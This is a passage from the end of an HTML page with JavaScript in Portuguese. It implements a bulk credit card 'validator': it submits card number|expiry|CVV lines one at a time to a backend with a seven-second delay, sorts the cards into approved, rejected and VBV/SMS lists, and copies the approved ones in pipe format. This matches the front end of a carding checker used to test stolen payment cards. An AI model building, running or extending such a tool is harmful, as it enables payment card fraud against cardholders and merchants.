                    return;
                }
                
                if (data.resultado) {
                    addResult(data.resultado);
                }
                
                currentIndex++;
                
                // Delay de 7 segundos entre cartões
                await new Promise(resolve => setTimeout(resolve, 7000));
                processNext();
                
            } catch (error) {
                console.error('Erro:', error);
                addResult({
                    status: 'rejected',
                    msg: '❌ REPROVADO | Erro de conexão'
                });
                currentIndex++;
                await new Promise(resolve => setTimeout(resolve, 7000));
                processNext();
            }
        }
        
        async function startValidation() {
            if (isProcessing) return;
            
            const rawText = cartoesInput.value;
            const lines = rawText.split('\n').filter(line => line.trim());
            
            if (lines.length === 0) {
                alert('Insira pelo menos um cartão para validar');
                return;
            }
            
            isProcessing = true;
            isPaused = false;
            shouldStop = false;
            cartoesList = lines;
            currentIndex = 0;
            approved = [];
            rejected = [];
            vbv = [];
            
            approvedList.innerHTML = '<div class="empty-state">processando em tempo real...</div>';
            rejectedList.innerHTML = '<div class="empty-state">processando em tempo real...</div>';
            updateStats();
            
            startBtn.disabled = true;
            pauseBtn.disabled = false;
            stopBtn.disabled = false;
            startBtn.textContent = '⚡ PROCESSANDO...';
            progressContainer.classList.add('active');
            progressFill.style.width = '0%';
            
            await sendAction('resume');
            processNext();
        }
        
        function pauseValidation() {
            if (!isProcessing) return;
            isPaused = !isPaused;
            pauseBtn.textContent = isPaused ? '▶ RETOMAR' : '⏸ PAUSAR';
            progressText.textContent = isPaused ? '⏸ PAUSADO - Clique em RETOMAR para continuar' : '▶ Processando...';
            sendAction(isPaused ? 'pause' : 'resume');
        }
        
        function stopValidation() {
            if (!isProcessing) return;
            shouldStop = true;
            isPaused = false;
            pauseBtn.textContent = '⏸ PAUSAR';
            startBtn.disabled = false;
            startBtn.textContent = '▶ INICIAR';
            pauseBtn.disabled = true;
            stopBtn.disabled = true;
            sendAction('stop');
        }
        
        function copyApproved() {
            if (approved.length === 0 && vbv.length === 0) {
                alert('Nenhum cartão aprovado ou VBV para copiar!');
                return;
            }
            
            let textToCopy = '';
            if (approved.length > 0) {
                textToCopy += '=== APROVADOS ===\n';
                approved.forEach(a => {
                    const match = a.msg.match(/\|\s*(\d+)\|(\d+)\|(\d+)\|(\d+)/);
                    if (match) textToCopy += `${match[1]}|${match[2]}|${match[3]}|${match[4]}\n`;
                });
            }
            
            if (vbv.length > 0) {
                if (textToCopy) textToCopy += '\n=== VBV/SMS ON ===\n';
                vbv.forEach(v => {
                    const match = v.msg.match(/\|\s*(\d+)\|(\d+)\|(\d+)\|(\d+)/);
                    if (match) textToCopy += `${match[1]}|${match[2]}|${match[3]}|${match[4]}\n`;
                });
            }
            
            navigator.clipboard.writeText(textToCopy).then(() => {
                const originalText = copyBtn.textContent;
                copyBtn.textContent = '✓ COPIADO!';
                setTimeout(() => {
                    copyBtn.textContent = originalText;
                }, 2000);
            }).catch(() => {
                alert('Erro ao copiar!');
            });
        }
        
        startBtn.addEventListener('click', startValidation);
        pauseBtn.addEventListener('click', pauseValidation);
        stopBtn.addEventListener('click', stopValidation);
        copyBtn.addEventListener('click', copyApproved);
        
        pauseBtn.disabled = true;
        stopBtn.disabled = true;
        
        if (!cartoesInput.value) {
            cartoesInput.value = '4111111111111111|12|26|123\n5555555555554444|10|25|789';
        }
    </script>
</body>
</html>